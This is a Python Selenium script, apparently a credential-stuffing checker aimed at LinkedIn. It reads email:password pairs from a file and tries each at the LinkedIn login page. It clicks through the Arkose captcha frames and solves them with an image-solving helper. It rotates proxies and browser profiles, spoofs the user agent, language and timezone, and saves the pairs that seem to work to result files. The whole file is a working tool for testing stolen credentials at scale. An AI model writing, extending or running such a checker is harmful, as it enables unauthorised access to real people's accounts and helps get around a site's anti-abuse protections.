import time
import asyncio

from selenium.webdriver.chrome.service import Service
from seleniumwire import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

from data.paths import*
from data.workCaptcha import resultImage
from data.proxyConnect import createOption
from data.VPN import connect_to_vpn, disconnect_vpn


options = webdriver.FirefoxOptions()
service = Service(executable_path=geckodriver_path)
options.set_preference("general.useragent.override", user_agent)
options.set_preference("intl.accept_languages", "en-US, en")
options.set_preference("timezoneId", "America/Los_Angeles")


async def clickBtnCaptcha(driver):
    driver.switch_to.window(driver.window_handles[-1])
    await asyncio.sleep(2)
    driver.switch_to.frame(WebDriverWait(driver, 10).until( EC.presence_of_element_located((By.XPATH, '//*[@id="captcha-internal"]'))))
    driver.switch_to.frame(WebDriverWait(driver, 10).until( EC.presence_of_element_located((By.XPATH, '//*[@id="arkoseframe"]'))))
    driver.switch_to.frame(WebDriverWait(driver, 10).until( EC.presence_of_element_located((By.XPATH, '//*[@id="arkose"]/div/iframe'))))
    driver.switch_to.frame(WebDriverWait(driver, 10).until( EC.presence_of_element_located((By.XPATH, '//*[@id="fc-iframe-wrap"]'))))
    driver.switch_to.frame(WebDriverWait(driver, 10).until( EC.presence_of_element_located((By.XPATH, '//*[@id="CaptchaFrame"]'))))
    WebDriverWait(driver, 10).until( EC.element_to_be_clickable((By.XPATH, '//*[@id="home_children_button"]'))).click()

async def createCaptcha(driver):   
    driver.switch_to.window(driver.window_handles[-1])
    await asyncio.sleep(2) 
    driver.get_screenshot_as_file(screenSot)
    result = resultImage()
    driver.switch_to.frame(WebDriverWait(driver, 10).until( EC.presence_of_element_located((By.XPATH, '//*[@id="captcha-internal"]'))))
    driver.switch_to.frame(WebDriverWait(driver, 10).until( EC.presence_of_element_located((By.XPATH, '//*[@id="arkoseframe"]'))))
    driver.switch_to.frame(WebDriverWait(driver, 10).until( EC.presence_of_element_located((By.XPATH, '//*[@id="arkose"]/div/iframe'))))
    driver.switch_to.frame(WebDriverWait(driver, 10).until( EC.presence_of_element_located((By.XPATH, '//*[@id="fc-iframe-wrap"]'))))
    driver.switch_to.frame(WebDriverWait(driver, 10).until( EC.presence_of_element_located((By.XPATH, '//*[@id="CaptchaFrame"]'))))
    li_element = driver.find_element(By.XPATH, f'//*[@id="image{result}"]')
    li_element.find_element(By.TAG_NAME, 'a').click()
    print(f"click link:{result}")

async def checkEmail(driver, email, password):
    semaphore = asyncio.Semaphore(1)
    result = 0
    try:
        element = WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="username"]')))
        element.clear()
        element.send_keys(email)
        element = WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="password"]')))
        element.clear()
        element.send_keys(password)
        WebDriverWait(driver, 10).until( EC.element_to_be_clickable((By.XPATH, '/html/body/div/main/div[2]/div[1]/form/div[3]/button'))).click()
        try:
            element = WebDriverWait(driver, 5).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="username"]')))
            return result
        except Exception as ex:
            pass
        # ================================
        try:
            while(True):
                await clickBtnCaptcha(driver)
                try:
                    while(True):
                        await createCaptcha(driver)
                except Exception as ex:
                    pass
        except Exception as ex:
            pass
        
        element = WebDriverWait(driver, 5).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="username"]')))
    except Exception as ex:
        result = 1
    return result


def changeDriver(i, driver, options):
    if (i%3 == 0) or (not driver):
        try:
            driver.quit()
        except Exception as ex:
            pass
        # connect_to_vpn()
        options = createOption(i, options)
        driver = webdriver.Firefox(options=options, service=service)
    driver.delete_all_cookies()

    return driver

async def main(start, resultFile, lines):
        driver = webdriver.Firefox(options=options, service=service)
        # driver.execute_cdp_cmd("Emulation.setGeolocationOverride", { "latitude": 37.7749, "longitude": -122.4194, "accuracy": 100 })
        for i, line in enumerate(lines):
            start_time = time.time()
            driver = changeDriver(i,  driver, options)
            driver.get("https://www.linkedin.com/login/uk?fromSignIn=true&trk=guest_homepage-basic_nav-header-signin")
            dat = line.strip().split(":")
            start+=1
            if ((await checkEmail(driver, dat[0], dat[1])) == 1):
                print(str(start) + " - ok")
                with open(resultFile, 'a', encoding='utf-8') as file:
                    file.write(line)
            else:
                print(str(start) + " - not")
            print(f"Время выполнения: {time.time() - start_time} секунд")

def generateLines(start, end):
    lines =[]
    print(f'start:{start}, finish:{end}')
    with open(file_path, 'r', encoding='utf-8') as file:
        for i, line in enumerate(file):
            if (i >= start) and (i < end):
                lines.append(line)
            if (i >= end):
                break
        return lines

def run_main(index, result_file_path):
    asyncio.run(main(index * 100, f'{result_file_path}\\result{index}.txt', generateLines(index*100, index*100+100)))

if __name__ == "__main__":
    start = 0
    asyncio.run(main(start, f'{resultFilePath}\\result{0}.txt', generateLines(start, 100)))







# async def main_task():
#     with ThreadPoolExecutor(max_workers=10) as executor:
#         futures = []
#         for i in range(10):
#             futures.append(executor.submit(run_main, i, resultFilePath))
#         for future in futures:
#             future.result()

# if __name__ == "__main__":
#     with open(file_path, 'r', encoding='utf-8') as file:
#         print(f'lenth: {sum(1 for _ in file)}')
#     asyncio.run(main_task())
